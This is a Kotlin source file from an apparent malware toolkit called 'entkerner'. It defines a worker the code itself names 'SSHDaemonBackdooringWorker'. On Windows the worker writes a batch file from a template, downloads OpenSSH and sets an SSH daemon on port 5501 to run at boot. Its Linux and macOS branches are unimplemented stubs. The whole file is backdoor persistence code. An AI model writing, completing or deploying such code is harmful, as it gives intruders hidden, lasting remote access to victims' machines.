package net.kerner.entkerner.extractors.ssh

import io.ktor.client.*
import kotlinx.coroutines.runBlocking
import net.kerner.entkerner.Entkerner
import net.kerner.entkerner.extractors.standart.OnBootExecutorWorker
import net.kerner.entkerner.io.JavaClassLoaderResources
import net.kerner.entkerner.model.SystemType
import java.io.File
import kotlin.io.path.absolutePathString
import kotlin.io.path.div

class SSHDaemonInstaller(
    httpClient: HttpClient,
    entkerner: Entkerner,
    val port: Int = 5501
) : OnBootExecutorWorker("SSHDaemon", httpClient, entkerner) {
    override val name = "SSHDaemonBackdooringWorker"

    override fun installWindows(file: File): File {
        val sshDaemonFile = File(file, "RunSshDaemon.bat")
        sshDaemonFile.createNewFile()
        val batch = String(JavaClassLoaderResources.getResource("windows/SshDaemon.bat").readBytes())
            .replace("\$path\$", (file.toPath() / "OpenSSH-Win64").absolutePathString())
            .replace("\$port\$", port.toString())
        sshDaemonFile.writeText(batch)

        runBlocking {
            OpenSSHDaemonInstallerWindows.installFile(httpClient, file)
        }
        return sshDaemonFile
    }

    override fun installLinux(file: File) {
        TODO("Not yet implemented")
    }

    override fun installDarwin(file: File) {
        TODO("Not yet implemented")
    }
}